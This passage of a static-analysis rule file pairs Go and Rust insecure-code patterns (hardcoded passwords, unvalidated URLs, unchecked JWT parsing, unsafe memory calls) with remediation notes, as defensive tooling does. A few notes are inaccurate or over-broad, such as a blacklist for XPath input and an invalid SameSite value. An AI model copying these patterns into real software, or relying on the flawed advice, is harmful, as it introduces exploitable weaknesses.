- cryptography
- CWE-328
- CWE-327
rule:
  kind: import
  pattern: import "crypto/md5"
note: 'MD5 and SHA1 have known collision vulnerabilities. Use SHA256, SHA512, or argon2
  instead.

  For password hashing, use bcrypt or argon2.

  '
---
id: go-cwe-326-inadequate-encryption-strength
language: go
severity: high
message: 'CWE-326: Inadequate Encryption Strength - weak TLS version or small RSA
  keys'
tags:
- security
- cryptography
- CWE-326
- OWASP-Encryption
rule:
  kind: assignment
  pattern: 'MinVersion: tls.VersionTLS11'
note: 'SSL 3.0, TLS 1.0, TLS 1.1 have known vulnerabilities. Use TLS 1.2 minimum,
  prefer TLS 1.3.

  RSA keys must be at least 2048 bits (3072+ recommended). Use ECDSA for smaller keys.

  '
---
id: go-cwe-327-weak-cipher-suites
language: go
severity: medium
message: 'CWE-327: Use of Broken Crypto Algorithm - weak or non-PFS cipher suites'
tags:
- security
- cryptography
- CWE-327
- OWASP-Encryption
rule:
  kind: assignment
  pattern: tls.TLS_RSA_WITH_RC4_128_SHA
note: 'RC4, 3DES, and ciphers without PFS are weak. Use ECDHE with AES-GCM or ChaCha20-Poly1305.

  Prefer TLS defaults over custom cipher lists.

  '
---
id: go-cwe-90-ldap-injection
language: go
severity: high
message: 'CWE-90: LDAP Injection - user input concatenated into LDAP filters'
tags:
- security
- injection
- CWE-90
- OWASP-Injection
rule:
  kind: call
  pattern: ldap.EscapeFilter(username)
note: 'Use ldap.EscapeFilter() to escape special characters in LDAP filters.

  Never concatenate user input directly into filter strings.

  '
---
id: go-cwe-79-template-injection-html
language: go
severity: high
message: 'CWE-79: Cross-site Scripting (XSS) - text/template used for HTML or unsafe
  HTML markers'
tags:
- security
- injection
- CWE-79
- OWASP-XSS
rule:
  kind: import
  pattern: import "text/template"
note: 'Use html/template instead of text/template for HTML output. Go''s template/html
  provides auto-escaping.

  Only use template.HTML() for trusted content; never for user input.

  '
---
id: go-cwe-94-code-injection-template
language: go
severity: critical
message: 'CWE-94: Code Injection - user-controlled template parsing or file paths'
tags:
- security
- injection
- CWE-94
- OWASP-CodeInjection
rule:
  kind: call
  pattern: template.New("t").Parse(userInput)
note: 'Never allow users to control template content. Only parse trusted embedded
  templates.

  Validate file paths against allowlist if dynamic path access needed.

  '
---
id: go-cwe-643-xpath-injection
language: go
severity: high
message: 'CWE-643: XPath Injection - user input concatenated into XPath expressions'
tags:
- security
- injection
- CWE-643
- OWASP-Injection
rule:
  kind: call
  pattern: 'xpath := fmt.Sprintf("//user[@name=''%s'']", username)

    '
note: 'Escape or parameterize XPath input. Validate against character blacklist to
  prevent injection:

  Block []''"@" characters if possible.

  '
---
id: go-cwe-117-log-injection
language: go
severity: medium
message: 'CWE-117: Improper Output Neutralization for Logs - unvalidated user input
  in logs'
tags:
- security
- injection
- CWE-117
- OWASP-Injection
rule:
  kind: call
  pattern: 'log.Printf("User logged in: %s", username)'
note: 'Sanitize log input: remove/escape newlines and carriage returns.

  Use %q format or structured logging to prevent log forging and ANSI injection.

  '
---
id: go-cwe-918-ssrf
language: go
severity: high
message: 'CWE-918: Server-Side Request Forgery - unvalidated user URLs in HTTP requests'
tags:
- security
- network
- CWE-918
- OWASP-SSRF
rule:
  kind: call
  pattern: http.Get(userURL)
note: 'Validate URLs against allowlist of domains. Block internal IPs (127.0.0.1,
  10.0.0.0/8, 169.254.0.0/16).

  Use filepath.Clean and string prefix checks to prevent traversal.

  '
---
id: go-cwe-319-cleartext-transmission
language: go
severity: medium
message: 'CWE-319: Cleartext Transmission of Sensitive Information - HTTP instead
  of HTTPS'
tags:
- security
- network
- CWE-319
- OWASP-Transport
rule:
  kind: call
  pattern: http.Get("http://...")
note: 'Always use HTTPS for network requests. HTTP transmits data in plaintext vulnerable
  to eavesdropping.

  Enforce HSTS headers on servers to prevent downgrade attacks.

  '
---
id: go-cwe-200-binding-all-interfaces
language: go
severity: medium
message: 'CWE-200: Exposure of Sensitive Information - server binding to 0.0.0.0'
tags:
- security
- network
- CWE-200
- OWASP-Exposure
rule:
  kind: call
  pattern: http.ListenAndServe(":8080", handler)
note: 'Bind to specific interfaces (127.0.0.1 for localhost, or specific internal
  IPs).

  Never bind to 0.0.0.0 unless service is intended to be public.

  '
---
id: go-cwe-400-missing-http-timeouts
language: go
severity: medium
message: 'CWE-400: Uncontrolled Resource Consumption - missing HTTP timeouts'
tags:
- security
- network
- CWE-400
- OWASP-DoS
rule:
  kind: call
  pattern: http.DefaultClient.Get(url)
note: 'Set explicit timeouts on http.Client and http.Server to prevent Slowloris attacks.

  Use ReadTimeout, WriteTimeout, and IdleTimeout fields with reasonable values.

  '
---
id: go-cwe-22-path-traversal
language: go
severity: high
message: 'CWE-22: Path Traversal - user input in file paths without validation'
tags:
- security
- filesystem
- CWE-22
- OWASP-PathTraversal
rule:
  kind: call
  pattern: os.Open(filepath.Join(baseDir, userInput))
note: 'Use filepath.Clean() and verify resolved path starts with baseDir.

  Use filepath.Rel() and check for ".." prefix in relative path.

  '
---
id: go-cwe-732-insecure-file-permissions
language: go
severity: medium
message: 'CWE-732: Incorrect Permission Assignment - world-writable file/directory
  permissions'
tags:
- security
- filesystem
- CWE-732
- OWASP-Permissions
rule:
  kind: call
  pattern: os.WriteFile(path, data, 0777)
note: 'Use restrictive permissions: 0600 for files (owner only), 0644 for readable
  files, 0750 for directories.

  Never use 0777 or 0666 permissions.

  '
---
id: go-cwe-377-insecure-temp-file
language: go
severity: medium
message: 'CWE-377: Insecure Temporary File - predictable temp file names or TOCTOU
  race'
tags:
- security
- filesystem
- CWE-377
- OWASP-Permissions
rule:
  kind: call
  pattern: os.Create("/tmp/data.txt")
note: 'Use os.CreateTemp() for cryptographically random temp file names.

  Use os.MkdirTemp() for secure temporary directories.

  '
---
id: go-cwe-59-symlink-following
language: go
severity: medium
message: 'CWE-59: Symlink Following - operations on user-controlled paths without
  symlink checks'
tags:
- security
- filesystem
- CWE-59
- CWE-61
rule:
  kind: call
  pattern: os.Open(userPath)
note: 'Check if path is a symlink using os.Lstat() and os.ModeSymlink.

  Resolve symlinks and verify resolved path is within allowed directory.

  '
---
id: go-cwe-787-unsafe-package
language: go
severity: high
message: 'CWE-787: Out-of-bounds Write - unsafe package usage'
tags:
- security
- memory
- CWE-787
- CWE-119
rule:
  kind: import
  pattern: import "unsafe"
note: 'Avoid unsafe package; it bypasses memory safety. Use encoding/binary for bytes,
  reflect for inspection.

  If unsafe required, carefully validate pointers and bounds.

  '
---
id: go-cwe-190-integer-overflow
language: go
severity: medium
message: 'CWE-190: Integer Overflow - unsafe type conversions without bounds checking'
tags:
- security
- memory
- CWE-190
- CWE-191
rule:
  kind: cast
  pattern: int32(int64Var)
note: 'Check bounds before conversion: int64Var > math.MaxInt32 or < math.MinInt32.

  Use math/bits.Add64() and math/bits.Mul64() for overflow detection.

  '
---
id: go-cwe-129-array-index-out-of-bounds
language: go
severity: medium
message: 'CWE-129: Improper Validation of Array Index - slice access without bounds
  checking'
tags:
- security
- memory
- CWE-129
- CWE-787
rule:
  kind: index
  pattern: data[userIndex]
note: 'Always validate: userIndex >= 0 && userIndex < len(data).

  For slice operations, ensure: start >= 0 && end <= len(data) && start <= end.

  '
---
id: go-cwe-120-cgo-buffer-overflow
language: go
severity: critical
message: 'CWE-120: Buffer Copy Without Bounds Checking - CGO unsafe C function calls'
tags:
- security
- memory
- CWE-120
- CWE-680
rule:
  kind: call
  pattern: C.strcpy(dst, src)
note: 'Use safe alternatives: C.strncpy(), C.snprintf(), C.memmove().

  Validate string lengths before CGO calls. Handle strings in Go before passing to
  C.

  '
---
id: go-cwe-362-race-condition
language: go
severity: high
message: 'CWE-362: Race Condition - shared variable modification without synchronization'
tags:
- security
- concurrency
- CWE-362
- OWASP-Concurrency
rule:
  kind: statement
  pattern: go func() { counter++ }()
note: 'Use sync.Mutex for exclusive access, sync.Map for concurrent maps, or channels
  for communication.

  Use atomic operations for simple counters: atomic.AddInt64().

  Run tests with: go build -race

  '
---
id: go-cwe-367-toctou-race
language: go
severity: medium
message: 'CWE-367: Time-of-check Time-of-use Race - state changes between check and
  use'
tags:
- security
- concurrency
- CWE-367
- OWASP-RaceCondition
rule:
  kind: statement
  pattern: if _, err := os.Stat(path); err == nil { os.ReadFile(path) }
note: 'Open file directly instead of stat-then-open. Use database transactions with
  row locking.

  Atomic operations for critical checks and mutations.

  '
---
id: go-cwe-400-goroutine-leak
language: go
severity: medium
message: 'CWE-400: Uncontrolled Resource Consumption - goroutine leaks from missing
  context'
tags:
- security
- concurrency
- CWE-400
- OWASP-DoS
rule:
  kind: statement
  pattern: go func() { <-ch }()
note: 'Always pass context.Context to goroutines and check for cancellation in select.

  Use defer cancel() to ensure cleanup. Implement worker pools for goroutine control.

  '
---
id: go-cwe-798-hardcoded-credentials
language: go
severity: critical
message: 'CWE-798: Use of Hard-coded Credentials - passwords/tokens hardcoded in source'
tags:
- security
- authentication
- CWE-798
- OWASP-Credentials
rule:
  kind: assignment
  pattern: password := "admin123"
note: 'Load credentials from environment variables or secret management systems.

  Never commit credentials to version control. Use encrypted config files or key vaults.

  '
---
id: go-cwe-916-weak-password-hashing
language: go
severity: high
message: 'CWE-916: Use of Password Hash With Insufficient Computational Effort - weak
  hash functions'
tags:
- security
- authentication
- CWE-916
- OWASP-Authentication
rule:
  kind: call
  pattern: sha256.Sum256([]byte(password))
note: 'Use bcrypt (golang.org/x/crypto/bcrypt) or argon2 for password hashing.

  Avoid sha256, md5, or simple salting. Use bcrypt.GenerateFromPassword().

  '
---
id: go-cwe-347-jwt-signature-bypass
language: go
severity: critical
message: 'CWE-347: Improper Verification of Cryptographic Signature - JWT validation
  failure'
tags:
- security
- authentication
- CWE-347
- OWASP-Authentication
rule:
  kind: call
  pattern: jwt.Parse(tokenString, nil)
note: 'Validate JWT algorithm (reject "none"). Verify token.Valid and check for errors.

  Use KeyFunc that validates the signing method against whitelist.

  '
---
id: go-cwe-208-timing-attack
language: go
severity: medium
message: 'CWE-208: Observable Timing Discrepancy - string comparison on secrets'
tags:
- security
- authentication
- CWE-208
- OWASP-Timing
rule:
  kind: call
  pattern: if password == storedPassword
note: 'Use crypto/subtle.ConstantTimeCompare() for passwords, tokens, and signatures.

  Use hmac.Equal() for HMAC comparisons. Always constant-time compare sensitive data.

  '
---
id: go-cwe-384-session-fixation
language: go
severity: high
message: 'CWE-384: Session Fixation - predictable session IDs or user-controlled sessions'
tags:
- security
- authentication
- CWE-384
- OWASP-SessionManagement
rule:
  kind: assignment
  pattern: sessionID := strconv.Itoa(userID)
note: 'Generate cryptographically random session IDs using crypto/rand (32+ bytes).

  Include expiration time and regenerate session on privilege changes.

  '
---
id: go-cwe-209-error-message-info-leak
language: go
severity: medium
message: 'CWE-209: Generation of Error Message Containing Sensitive Information'
tags:
- security
- disclosure
- CWE-209
- OWASP-ErrorHandling
rule:
  kind: call
  pattern: http.Error(w, err.Error(), 500)
note: 'Log detailed errors internally but return generic messages to clients.

  Create custom error types with safe messages for API responses.

  '
---
id: go-cwe-210-panic-info-leak
language: go
severity: medium
message: 'CWE-210: Product-Generated Error Message Information Leak - panic recovery
  exposed'
tags:
- security
- disclosure
- CWE-210
- OWASP-ErrorHandling
rule:
  kind: statement
  pattern: w.Write(debug.Stack())
note: 'Log stack traces internally but return generic "Internal server error" to clients.

  Use defer recover() middleware to catch panics safely.

  '
---
id: go-cwe-489-debug-code
language: go
severity: high
message: 'CWE-489: Active Debug Code - debug mode enabled in production'
tags:
- security
- disclosure
- CWE-489
- OWASP-ErrorHandling
rule:
  kind: statement
  pattern: gin.SetMode(gin.DebugMode)
note: 'Use environment variables to control debug mode. Disable pprof and expvar in
  production.

  Never hardcode debug=true. Use os.Getenv("ENV") for environment checks.

  '
---
id: go-cwe-200-version-disclosure
language: go
severity: low
message: 'CWE-200: Exposure of Sensitive Information - version information disclosed'
tags:
- security
- disclosure
- CWE-200
- OWASP-Exposure
rule:
  kind: call
  pattern: w.Header().Set("Server", "MyApp/1.0.0")
note: 'Remove or obfuscate version headers. Require authentication for version endpoints.

  Use w.Header().Del("Server") to remove default Go server header.

  '
---
id: go-cwe-502-unsafe-json-unmarshal
language: go
severity: medium
message: 'CWE-502: Deserialization of Untrusted Data - unsafe JSON unmarshaling'
tags:
- security
- serialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: call
  pattern: var data interface{}; json.Unmarshal(userInput, &data)
note: 'Use specific struct types for unmarshaling. For large numbers, use json.Number.

  Validate unmarshaled data before use. Avoid interface{} for untrusted input.

  '
---
id: go-cwe-502-unsafe-gob-decode
language: go
severity: high
message: 'CWE-502: Deserialization of Untrusted Data - unsafe Gob decoding'
tags:
- security
- serialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: call
  pattern: gob.NewDecoder(networkConn).Decode(&data)
note: 'Use JSON or Protocol Buffers for untrusted sources. Limit registered types.

  Never register interface types for Gob deserialization from untrusted sources.

  '
---
id: go-cwe-502-unsafe-yaml-unmarshal
language: go
severity: medium
message: 'CWE-502: Deserialization of Untrusted Data - YAML with executable tags'
tags:
- security
- serialization
- CWE-502
- OWASP-Deserialization
rule:
  kind: call
  pattern: yaml.Unmarshal(userInput, &config)
note: 'Use gopkg.in/yaml.v3 instead of v2 (safer). Validate config structure after
  parsing.

  Be cautious with YAML tags that may execute code or instantiate objects.

  '
---
id: go-cwe-611-xxe-injection
language: go
severity: high
message: 'CWE-611: XXE - XML External Entity injection from untrusted XML'
tags:
- security
- serialization
- CWE-611
- OWASP-XXE
rule:
  kind: call
  pattern: xml.Unmarshal(userInput, &data)
note: 'Go''s encoding/xml is safe by default (no external entity processing).

  Limit request body size: http.MaxBytesReader(w, r.Body, 1<<20).

  '
---
id: go-cwe-284-reflection-bypass
language: go
severity: high
message: 'CWE-284: Improper Access Control - reflection bypasses visibility rules'
tags:
- security
- access-control
- CWE-284
- OWASP-AccessControl
rule:
  kind: call
  pattern: reflect.ValueOf(&s).Elem().FieldByName("unexportedField")
note: 'Avoid reflection on untrusted types. Use interfaces instead of reflection.

  Document reflection use and validate field names from input.

  '
---
id: go-cwe-1333-regex-dos
language: go
severity: medium
message: 'CWE-1333: Inefficient Regular Expression Complexity - ReDoS vulnerabilities'
tags:
- security
- dos
- CWE-1333
- OWASP-ReDoS
rule:
  kind: call
  pattern: regexp.MustCompile(userPattern)
note: 'Never compile regex from user input. Use pre-compiled patterns.

  If regex required, set timeout with context.WithTimeout(). Limit pattern length
  to 100 chars.

  '
---
id: go-cwe-476-nil-pointer-dereference
language: go
severity: medium
message: 'CWE-476: NULL Pointer Dereference - using nil value after error-prone operation'
tags:
- security
- error-handling
- CWE-476
- OWASP-ErrorHandling
rule:
  kind: statement
  pattern: user, err := getUser(id); if user.IsAdmin
note: 'Check error first, then check for nil before dereferencing.

  Always handle both error case and nil case for pointer returns.

  '
---
id: go-cwe-601-open-redirect
language: go
severity: medium
message: 'CWE-601: URL Redirection to Untrusted Site - unvalidated redirect URLs'
tags:
- security
- web
- CWE-601
- OWASP-OpenRedirect
rule:
  kind: call
  pattern: http.Redirect(w, r, userURL, http.StatusFound)
note: 'Validate URLs against allowlist of domains. Allow only relative paths (start
  with /).

  Use filepath.Clean and prevent // prefixes for protocol-relative URLs.

  '
---
id: go-cwe-352-csrf
language: go
severity: high
message: 'CWE-352: Cross-Site Request Forgery - missing CSRF token validation'
tags:
- security
- web
- CWE-352
- OWASP-CSRF
rule:
  kind: statement
  pattern: if r.Method == "POST" { transferMoney(amount) }
note: 'Use CSRF middleware (e.g., github.com/gorilla/csrf). Include token in forms.

  Verify CSRF token on all state-changing requests (POST, PUT, DELETE).

  '
---
id: go-cwe-1021-missing-security-headers
language: go
severity: medium
message: 'CWE-1021: Improper Restriction of Frame Reference - missing security headers'
tags:
- security
- web
- CWE-1021
- OWASP-Headers
rule:
  kind: statement
  pattern: w.Write([]byte("Hello"))
note: 'Add security headers: X-Content-Type-Options: nosniff, X-Frame-Options: DENY,

  Content-Security-Policy, X-XSS-Protection, Strict-Transport-Security, Referrer-Policy.

  '
---
id: go-cwe-614-cookie-without-secure-flag
language: go
severity: medium
message: 'CWE-614: Sensitive Cookie Without ''Secure'' Flag - insecure cookie settings'
tags:
- security
- web
- CWE-614
- CWE-1004
rule:
  kind: call
  pattern: 'http.SetCookie(w, &http.Cookie{Name: "session"})'
note: 'Set Secure: true (HTTPS only), HttpOnly: true (no JS access), SameSite: StrictMode.

  Include MaxAge for expiration. Never set default flags only.

  '
---
id: go-cwe-290-ip-spoofing
language: go
severity: medium
message: 'CWE-290: Authentication Bypass by Spoofing - trusting X-Forwarded-For'
tags:
- security
- network
- CWE-290
- OWASP-Headers
rule:
  kind: call
  pattern: ip := r.Header.Get("X-Forwarded-For")
note: 'Only trust X-Forwarded-For from known proxies. Validate proxy IP in RemoteAddr.

  Implement getClientIP() that validates proxy chain before trusting headers.

  '
---
id: go-cwe-598-query-string-sensitive-data
language: go
severity: medium
message: 'CWE-598: Information Exposure Through Query Strings - sensitive data in
  URLs'
tags:
- security
- disclosure
- CWE-598
- OWASP-DataExposure
rule:
  kind: call
  pattern: fmt.Sprintf("/api/data?token=%s", apiToken)
note: 'Use HTTP headers (Authorization) or POST body for sensitive data.

  Never put passwords, tokens, or keys in URLs. Sanitize logs that contain URLs.

  '
---
id: go-cwe-548-directory-listing
language: go
severity: low
message: 'CWE-548: Exposure of Information Through Directory Listing'
tags:
- security
- disclosure
- CWE-548
- OWASP-DirectoryListing
rule:
  kind: call
  pattern: http.FileServer(http.Dir("static"))
note: 'Disable directory listing. Use custom file server that blocks directory access.

  Require index.html for directory requests or return 404.

  '
---
id: go-cwe-400-unbounded-resource-allocation
language: go
severity: medium
message: 'CWE-400: Uncontrolled Resource Consumption - unbounded allocation'
tags:
- security
- dos
- CWE-400
- CWE-770
rule:
  kind: statement
  pattern: data := make([]byte, sizeInt)
note: 'Limit request body: http.MaxBytesReader(). Validate size parameters against
  max.

  Use worker pools for goroutines. Set memory limits for allocations.

  '
---
id: go-cwe-22-zip-slip
language: go
severity: high
message: 'CWE-22: Path Traversal - Zip Slip vulnerability in archive extraction'
tags:
- security
- filesystem
- CWE-22
- OWASP-PathTraversal
rule:
  kind: statement
  pattern: path := filepath.Join(destDir, f.Name)
note: 'Validate extracted paths are within destDir. Use strings.HasPrefix() after
  filepath.Clean().

  Check for ".." in relative path from filepath.Rel(). Create parent dirs carefully.

  '
---
id: go-cwe-295-certificate-pinning
language: go
severity: medium
message: 'CWE-295: Improper Certificate Validation - weak certificate pinning'
tags:
- security
- tls
- CWE-295
- OWASP-CertificatePinning
rule:
  kind: assignment
  pattern: 'VerifyPeerCertificate: func(...) error { return nil }'
note: 'Implement proper certificate pinning: extract subject public key, compute SHA256,
  encode as base64.

  Compare against expected pins. Return error if no match. Validate full cert chain.

  '
---
id: go-cwe-915-prototype-pollution
language: go
severity: medium
message: 'CWE-915: Improper Modification of Dynamically-Determined Attributes - map
  mutation'
tags:
- security
- data-integrity
- CWE-915
- OWASP-MassAssignment
rule:
  kind: statement
  pattern: globalConfig[key] = value
note: 'Use allowlist for user-controlled keys. Use struct types instead of maps for
  config.

  Validate and explicitly assign individual fields from user input.

  '
---
id: go-cwe-330-insufficient-entropy
language: go
severity: high
message: 'CWE-330: Use of Insufficiently Random Values - secrets with insufficient
  entropy'
tags:
- security
- cryptography
- CWE-330
- OWASP-Randomness
rule:
  kind: statement
  pattern: token := make([]byte, 8)
note: 'Use at least 32 bytes (256 bits) for secrets. Use base64.URLEncoding to preserve
  entropy.

  Never use UUIDs for secrets (only 122 bits, predictable versions).

  '
---
id: go-cwe-426-environment-variable-injection
language: go
severity: high
message: 'CWE-426: Untrusted Search Path - environment variable injection'
tags:
- security
- injection
- CWE-426
- CWE-78
rule:
  kind: call
  pattern: os.Setenv(userKey, userValue)
note: 'Never set env vars from user input. Use allowlist for subprocess environment.

  Clear dangerous vars like LD_PRELOAD, PATH. Pass only required vars explicitly.

  '
---
id: rust-sec-001-unaudited-unsafe-block
language: rust
severity: warning
message: 'Unsafe block without // SAFETY: comment requires documentation explaining
  why code is sound'
tags:
- security
- unsafe-code
- documentation
rule:
  kind: unsafe_block
  pattern: unsafe\s*\{[^}]*\}
note: 'All unsafe blocks require safety documentation explaining why the code is sound.

  Missing safety comments indicate unreviewed unsafe code.


  Add `// SAFETY: <explanation>` comment above every unsafe block explaining invariants.


  Reference: Rust API Guidelines - https://rust-lang.github.io/api-guidelines/documentation.html#c-failure

  '
---
id: rust-cwe-680-transmute-size-mismatch
language: rust
severity: error
message: 'CWE-680: Transmute between types of different sizes causes undefined behavior'
tags:
- security
- memory-safety
- CWE-680
rule:
  kind: function_call
  pattern: std::mem::transmute::<\w+,\s*\w+>\(
note: 'Transmuting between types of different sizes is undefined behavior and will
  cause

  memory corruption. Use safe conversion methods or compile-time assertions to ensure

  types have identical sizes.


  Fix: Use safe conversion (e.g., `as` cast) or use compile-time assertion:

  const _: () = assert!(std::mem::size_of::<T>() == std::mem::size_of::<U>());


  Reference: std::mem::transmute docs - https://doc.rust-lang.org/std/mem/fn.transmute.html

  '
---
id: rust-sec-003-transmute-ref-without-lifetime
language: rust
severity: error
message: Transmute to reference without lifetime bypasses borrow checker and creates
  dangling references
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: function_call
  pattern: transmute::<\*(?:const|mut)\s+\w+,\s*&(?:mut)?\s*\w+>
note: 'Converting raw pointers to references via transmute bypasses borrow checker
  and can

  create dangling references or aliasing violations.


  Fix: Use `as_ref()` or `as_mut()` with proper Option handling instead.

  Example: let r: Option<&T> = unsafe { ptr.as_ref() };


  Reference: Rustonomicon - Transmute - https://doc.rust-lang.org/nomicon/transmutes.html

  '
---
id: rust-sec-004-transmute-integer-pointer
language: rust
severity: warning
message: Transmute between integer and pointer violates provenance rules
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: function_call
  pattern: transmute::<(?:usize|isize|u32|i32|u64|i64),\s*\*(?:const|mut)
note: 'Transmuting between integers and pointers violates strict provenance rules
  and

  causes undefined behavior in optimized code.


  Fix: Use `as` casts for pointer-integer conversions, or use ptr::from_exposed_addr

  on nightly Rust.


  Reference: Strict Provenance - https://doc.rust-lang.org/std/ptr/index.html#provenance

  '
---
id: rust-cwe-476-null-pointer-dereference
language: rust
severity: error
message: 'CWE-476: Raw pointer dereference without null check is undefined behavior'
tags:
- security
- memory-safety
- CWE-476
rule:
  kind: unsafe_block
  pattern: unsafe\s*\{\s*\*\w+\s*
note: "Dereferencing null or invalid pointers is undefined behavior and can cause\
  \ crashes\nor security vulnerabilities.\n\nFix: Check for null using ptr.is_null()\
  \ before dereferencing:\nif !ptr.is_null() {\n    unsafe { *ptr }\n}\n\nReference:\
  \ Rustonomicon - Working with Unsafe - https://doc.rust-lang.org/nomicon/working-with-unsafe.html\n"
---
id: rust-sec-006-unsafe-impl-send-sync
language: rust
severity: warning
message: Unsafe impl Send/Sync requires documentation explaining thread safety
tags:
- security
- concurrency
- unsafe-code
rule:
  kind: impl_declaration
  pattern: unsafe\s+impl\s+(?:Send|Sync)\s+for
note: 'Incorrectly implementing Send/Sync can cause data races. These implementations

  require careful analysis and documentation.


  Fix: Add safety documentation explaining why the type is thread-safe. Consider

  using PhantomData for proper variance.


  Reference: Rustonomicon - Send and Sync - https://doc.rust-lang.org/nomicon/send-and-sync.html

  '
---
id: rust-sec-007-unsafe-function-missing-docs
language: rust
severity: warning
message: 'Unsafe public function missing # Safety documentation section'
tags:
- security
- documentation
- unsafe-code
rule:
  kind: function_declaration
  pattern: pub\s+unsafe\s+fn
note: 'Unsafe public functions must document their safety requirements so callers
  know

  what invariants to uphold.


  Fix: Add `# Safety` documentation section listing all preconditions and invariants.


  Reference: Rust API Guidelines - https://rust-lang.github.io/api-guidelines/documentation.html#c-failure

  '
---
id: rust-cwe-824-uninitialized-memory
language: rust
severity: error
message: 'CWE-824: MaybeUninit::assume_init() called without proper initialization
  is undefined behavior'
tags:
- security
- memory-safety
- CWE-824
rule:
  kind: function_call
  pattern: MaybeUninit::uninit\(\)\.assume_init\(\)
note: 'Assuming uninitialized memory is initialized is undefined behavior for most
  types.


  Fix: Use MaybeUninit::zeroed() for zero-safe types or properly initialize before

  calling assume_init().


  Reference: std::mem::MaybeUninit - https://doc.rust-lang.org/std/mem/union.MaybeUninit.html

  '
---
id: rust-sec-009-manually-drop-double-free
language: rust
severity: error
message: ManuallyDrop::drop() called multiple times causes use-after-free
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: function_call
  pattern: ManuallyDrop::drop\(
note: 'Double-drop causes use-after-free. ManuallyDrop should be dropped exactly once

  or not at all.


  Fix: Ensure ManuallyDrop::drop is called at most once, typically through careful

  control flow analysis.


  Reference: std::mem::ManuallyDrop - https://doc.rust-lang.org/std/mem/struct.ManuallyDrop.html

  '
---
id: rust-cwe-823-uninitialized-read
language: rust
severity: error
message: 'CWE-823: Reading from uninitialized memory via ptr::read is undefined behavior'
tags:
- security
- memory-safety
- CWE-823
rule:
  kind: function_call
  pattern: ptr::read\(
note: 'Reading from uninitialized memory is undefined behavior.


  Fix: Ensure memory is initialized before reading, or use MaybeUninit::assume_init_read().


  Reference: std::ptr::read - https://doc.rust-lang.org/std/ptr/fn.read.html

  '
---
id: rust-cwe-119-buffer-overflow
language: rust
severity: error
message: 'CWE-119: Buffer overflow via get_unchecked without bounds verification'
tags:
- security
- memory-safety
- CWE-119
rule:
  kind: function_call
  pattern: get_unchecked\(
note: 'get_unchecked bypasses bounds checking and can cause buffer overflows.


  Fix: Verify index is in bounds, or use safe get() or [] indexing.


  Reference: slice::get_unchecked - https://doc.rust-lang.org/std/primitive.slice.html#method.get_unchecked

  '
---
id: rust-sec-012-vec-set-len-uninitialized
language: rust
severity: error
message: Vec::set_len() with uninitialized elements exposes uninitialized memory
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: function_call
  pattern: set_len\(\w+\)
note: 'Extending Vec length without initialization exposes uninitialized memory.


  Fix: Use vec.resize(), vec.extend(), or initialize memory before set_len().


  Reference: Vec::set_len - https://doc.rust-lang.org/std/vec/struct.Vec.html#method.set_len

  '
---
id: rust-sec-013-from-raw-parts-invalid
language: rust
severity: error
message: slice::from_raw_parts with potentially invalid pointer or length
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: function_call
  pattern: from_raw_parts(?:_mut)?\(
note: 'Creating slice from invalid pointer or incorrect length is undefined behavior.


  Fix: Validate pointer and length, ensure alignment, and verify memory is initialized.


  Reference: slice::from_raw_parts - https://doc.rust-lang.org/std/slice/fn.from_raw_parts.html

  '
---
id: rust-cwe-1104-string-utf8-unchecked
language: rust
severity: warning
message: 'CWE-1104: String::from_utf8_unchecked with untrusted input may panic'
tags:
- security
- input-validation
- CWE-1104
rule:
  kind: function_call
  pattern: String::from_utf8_unchecked\(
note: 'Invalid UTF-8 in a String causes undefined behavior. External data cannot be
  trusted.


  Fix: Use String::from_utf8() with proper error handling.


  Reference: String::from_utf8_unchecked - https://doc.rust-lang.org/std/string/struct.String.html#method.from_utf8_unchecked

  '
---
id: rust-sec-015-box-from-raw-arbitrary-pointer
language: rust
severity: error
message: Box::from_raw with pointer not from Box::into_raw causes double-free
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: function_call
  pattern: Box::from_raw\(
note: 'Creating Box from arbitrary pointer causes double-free or use-after-free.


  Fix: Only use Box::from_raw with pointers from Box::into_raw of same type.


  Reference: Box::from_raw - https://doc.rust-lang.org/std/boxed/struct.Box.html#method.from_raw

  '
---
id: rust-sec-016-forget-drop-implementation
language: rust
severity: warning
message: std::mem::forget on types with Drop impl may leak resources
tags:
- security
- resource-management
rule:
  kind: function_call
  pattern: std::mem::forget\(
note: 'Forgetting to run destructors can leak resources (memory, file handles, locks).


  Fix: Let values drop naturally, or use ManuallyDrop for explicit control.


  Reference: std::mem::forget - https://doc.rust-lang.org/std/mem/fn.forget.html

  '
---
id: rust-sec-017-packed-struct-reference
language: rust
severity: warning
message: References to packed struct fields cause undefined behavior on some architectures
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: field_access
  pattern: '&.*\..*'
note: 'References to unaligned fields cause undefined behavior on some architectures.


  Fix: Copy the field value to a local variable first, or use read_unaligned.


  Reference: repr(packed) - https://doc.rust-lang.org/nomicon/other-reprs.html#reprpacked

  '
---
id: rust-sec-018-mutable-reference-aliasing
language: rust
severity: error
message: Creating multiple &mut T to same location violates Rust's safety guarantee
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: unsafe_block
  pattern: '&mut'
note: 'Mutable aliasing is undefined behavior and violates Rust''s core safety guarantee.


  Fix: Use interior mutability (Cell/RefCell/Mutex) or UnsafeCell for legitimate cases.


  Reference: Rustonomicon - Aliasing - https://doc.rust-lang.org/nomicon/aliasing.html

  '
---
id: rust-sec-019-raw-pointer-moved-value
language: rust
severity: error
message: Using raw pointer to access value after move invalidates the pointer
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: unsafe_block
  pattern: unsafe
note: 'Moving a value invalidates raw pointers to it.


  Fix: Pin the value or ensure the value isn''t moved while pointers exist.


  Reference: std::pin - https://doc.rust-lang.org/std/pin/index.html

  '
---
id: rust-sec-020-union-inactive-field-read
language: rust
severity: warning
message: Reading from inactive union field may read uninitialized or incorrectly typed
  data
tags:
- security
- memory-safety
- unsafe-code
rule:
  kind: union_declaration
  pattern: union\s+\w+
note: 'Reading inactive union fields may read uninitialized or incorrectly typed data.


  Fix: Track active field with enum-like wrapper, or use only for FFI/transmute replacement.


  Reference: Rustonomicon - Unions - https://doc.rust-lang.org/nomicon/unions.html

  '
---
id: rust-sec-021-ffi-pointer-without-pin
language: rust
severity: warning
message: Passing Rust objects to C without pinning may invalidate pointers
tags:
- security
- ffi
